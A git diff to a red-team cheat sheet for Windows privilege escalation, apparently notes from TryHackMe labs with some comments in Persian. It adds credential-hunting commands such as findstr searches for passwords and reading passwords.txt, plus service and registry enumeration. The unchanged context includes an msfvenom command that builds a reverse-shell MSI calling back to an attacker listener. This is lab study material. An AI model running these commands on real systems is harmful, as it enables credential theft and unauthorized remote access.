@@ -56,6 +56,7 @@ dig -t DNSSEC redteam.thm @10.10.73.142
 # These tools are for gathering information and abusing common mistakes in Windows security configurations.
 https://github.com/GhostPack/Seatbelt
 https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+https://github.com/PowerShellMafia/PowerSploit
 ```
 
 ## Host-Security-Enumeration ✅
@@ -104,12 +105,12 @@ Get-Process -Name thm-demo # Checking Process activities associated with this se
 # Note: Process ID (PID) This is useful for the next steps.
 
 wmic product get name,version,vendor # چک کردن لیست همه‌ی نرم‌افزارهای نصب‌شده همراه با نسخه‌شون
+wmic service get name,displayname,pathname,startmode
 
 tasklist          # لیست پردازش‌های فعال
 tasklist | findstr <PID> 
 wmic process list full  # نمایش تمام جزئیات پردازش‌ها
 Get-ChildItem -Hidden -Path C:\Users\Public\  # لیست فایل‌های مخفی
-
 
 sc qc apphostsvc # برسی جزئیات پیکربندی یک سرویس خاص
 Get-SmbServerConfiguration # Check the SMB version running on a Windows system (in the internal network)
@@ -118,16 +119,24 @@ Get-SmbServerConfiguration # Check the SMB version running on a Windows system (
 > nslookup.exe # run tool
 > server <IP-Dns-Server> # Set dns server
 > ls -d thmredteam.com # Check Zone Transfer (if the server is not configured correctly, the domain information can be extracted)
+----------------------------------------------------------------
+✅ Check through the Windows Registry
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services /s /f "ImagePath"
 ```
 
 # Credentials ✅
 ## File-Unattended ✅
 ### cmd ✡️
 ```powershell
+
 dir C:\sysprep.inf /s /p
 dir C:\sysprep.xml /s /p
 dir C:\unattend.xml /s /p
 dir C:\Users\*\.ssh\ # Check SSH keys
+
+findstr /si password *.txt
+type C:\Users\Administrator\Desktop\passwords.txt
+
 
 Get-ChildItem -Path C:\ -Filter "sysprep.inf" -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\ -Filter "Unattend.xml" -Recurse -ErrorAction SilentlyContinue
@@ -182,6 +191,7 @@ schtasks /run /tn vulntask # target system
 ```cmd
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
+
 ------------------------------
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi # our kali
 # transfer malicious.msi file to our kali # target system
